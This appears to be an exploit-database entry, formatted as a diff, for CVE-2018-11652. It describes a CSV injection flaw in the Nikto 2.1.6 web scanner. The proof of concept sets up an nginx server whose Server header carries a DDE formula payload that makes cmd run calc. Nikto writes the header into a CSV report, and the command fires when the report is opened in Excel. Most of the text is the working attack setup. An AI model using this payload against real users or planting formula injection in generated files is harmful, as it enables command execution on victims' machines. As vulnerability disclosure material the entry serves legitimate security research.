@@ -1,0 +1,52 @@
+# Exploit Title: Nikto 2.1.6 - CSV Injection
+# Google Dork: N/A
+# Date: 2018-06-01	
+# Exploit Author: Adam Greenhill
+# Vendor Homepage: https://cirt.net/Nikto2
+# Software Link: https://github.com/sullo/nikto
+# Affected Version: 2.1.6, 2.1.5
+# Category: Applications
+# Tested on: Kali Linux 4.14 x64
+# CVE : CVE-2018-11652
+ 
+# Technical Description:
+#  CSV Injection vulnerability in Nikto 2.1.6 and earlier allows remote attackers 
+# to inject arbitrary OS commands via the Server field in an HTTP response header, 
+# which is directly injected into a CSV report.
+ 
+# PoC
+# Install nginx and nginx-extras: apt-get install -y nginx nginx-extras
+# Configure the nginx server as follows by editing the /etc/nginx/nginx.conf file:
+
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+    worker_connections 768;
+    # multi_accept on;
+}
+
+http {
+    server_tokens off; # removed pound sign
+    more_set_headers "Server: =cmd|' /C calc'!'A1'";
+
+    server {
+        listen 80;
+
+        server_name localhost;
+
+        location /hello {
+            return 200 "hello world";
+        }
+    }
+}
+
+# Restart the server: service nginx restart
+# Scan the nginx server with Nikto configured to output the results to a CSV file:
+
+nikto -h <nginx address>:80 -o vuln.csv
+
+# Open the resulting CSV file in Microsoft Excel and observe that CMD is attempting 
+# to execute
